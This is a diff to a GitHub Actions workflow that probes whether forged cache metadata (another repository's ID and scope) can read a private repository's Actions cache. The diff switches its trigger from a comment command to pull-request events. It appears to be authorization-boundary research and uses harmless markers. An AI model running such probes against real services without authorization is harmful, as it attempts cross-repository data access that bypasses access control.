@@ -1,8 +1,8 @@
 name: GHBB public cache metadata boundary probe
 
 on:
-  issue_comment:
-    types: [created]
+  pull_request:
+    types: [opened, synchronize, reopened]
 
 permissions:
   contents: read
@@ -11,7 +11,6 @@ permissions:
 
 jobs:
   probe:
-    if: ${{ github.event.issue.pull_request && contains(github.event.comment.body, '/ghbb-public-cache-metadata') }}
     runs-on: ubuntu-latest
     timeout-minutes: 10
     env:
@@ -22,15 +21,15 @@ jobs:
       VICTIM_VERSION: 4ebcb5f6ff2b3802f2a2b59322e39be80bfe0f33de47c5cf8e347bd801eb3652
       VICTIM_MARKER: GHBB-VICTIM-20260726-7c4f
     steps:
-      - name: Announce controlled public execution
+      - name: Announce controlled public PR execution
         uses: actions/github-script@v7
         with:
           script: |
             await github.rest.issues.createComment({
               owner: context.repo.owner,
               repo: context.repo.repo,
-              issue_number: context.issue.number,
-              body: `<!-- ghbb-public-cache-start -->\nGHBB public Actions canary started for run ${context.runId}. No secrets or third-party data will be requested.`
+              issue_number: context.payload.pull_request.number,
+              body: `<!-- ghbb-public-cache-pr-start -->\nGHBB public pull_request cache canary started for run ${context.runId}. No secrets or third-party data will be requested.`
             })
 
       - name: Create harmless attacker cache marker
@@ -67,12 +66,15 @@ jobs:
             const attackerRepositoryId = process.env.ATTACKER_REPOSITORY_ID
             const attackerVersion = process.env.ATTACKER_VERSION
             const attackerMarker = `GHBB-CACHE-METADATA-ATTACKER-${context.runId}`
+            const attackerScope = process.env.GITHUB_REF || 'refs/pull/2/merge'
             const victimRepositoryId = process.env.VICTIM_REPOSITORY_ID
             const victimKey = process.env.VICTIM_KEY
             const victimVersion = process.env.VICTIM_VERSION
             const victimMarker = process.env.VICTIM_MARKER
 
             const state = {
+              event: context.eventName,
+              attacker_scope: attackerScope,
               save_outcome: process.env.SAVE_OUTCOME || '<unset>',
               runtime_context_valid: Boolean(token && resultsUrl),
               positive_baseline_valid: false,
@@ -218,7 +220,7 @@ jobs:
                 version: attackerVersion,
                 metadata: {
                   repository_id: attackerRepositoryId,
-                  scope: [{scope: 'refs/heads/main', permission: '1'}]
+                  scope: [{scope: attackerScope, permission: '1'}]
                 },
                 expectedMarker: attackerMarker
               })
@@ -238,8 +240,7 @@ jobs:
               })
               state.wrong_scope_missed = !wrongScope.exact_marker && !wrongScope.signed_url
               state.metadata_parser_oracle = state.positive_current_metadata_valid && state.wrong_scope_missed
-              state.harness_valid = state.save_outcome === 'success' &&
-                state.positive_baseline_valid && state.positive_current_metadata_valid
+              state.harness_valid = state.positive_baseline_valid && state.positive_current_metadata_valid
 
               const foreignCases = [
                 {
@@ -261,10 +262,6 @@ jobs:
                 {
                   name: 'victim_empty_scope',
                   metadata: {repository_id: victimRepositoryId, scope: []}
-                },
-                {
-                  name: 'victim_attacker_scope',
-                  metadata: {repository_id: victimRepositoryId, scope: [{scope: 'refs/heads/main', permission: '3'}]}
                 },
                 {
                   name: 'victim_camelcase_control',
@@ -293,8 +290,8 @@ jobs:
               `- ${item.name}: \`http=${item.http}, ok=${item.ok}, signed=${item.signed_url}, matched=${item.matched_key}, download=${item.download_http}, bytes=${item.bytes}, archive=${item.archive_valid}, extract=${item.extract_exit}, exact=${item.exact_marker}, sha256=${item.sha256}\``
             )
             const body = [
-              '<!-- ghbb-public-cache-metadata-result -->',
-              `GHBB public cache metadata authorization result for run ${context.runId}:`,
+              '<!-- ghbb-public-cache-metadata-pr-result -->',
+              `GHBB public pull_request cache metadata result for run ${context.runId}:`,
               ...Object.entries(state).map(([name, value]) => `- ${name}: \`${value}\``),
               ...caseLines,
               '- runtime_token_signed_url_or_content_exposed: `false`'
@@ -302,14 +299,14 @@ jobs:
             await github.rest.issues.createComment({
               owner: context.repo.owner,
               repo: context.repo.repo,
-              issue_number: context.issue.number,
+              issue_number: context.payload.pull_request.number,
               body
             })
 
             if (!state.harness_valid) {
-              core.setFailed(`Public cache metadata harness invalid: ${state.failure}`)
+              core.setFailed(`Public PR cache metadata harness invalid: ${state.failure}`)
             } else if (state.authorization_boundary_failure) {
               core.setFailed('CONFIRMED_PRIVATE_CROSS_REPOSITORY_ACTIONS_CACHE_READ_VIA_CLIENT_METADATA')
             } else {
-              console.log('RESULT=PUBLIC_TO_PRIVATE_CACHE_METADATA_OVERRIDE_DENIED_EXPECTED')
+              console.log('RESULT=PUBLIC_PR_TO_PRIVATE_CACHE_METADATA_OVERRIDE_DENIED_EXPECTED')
             }
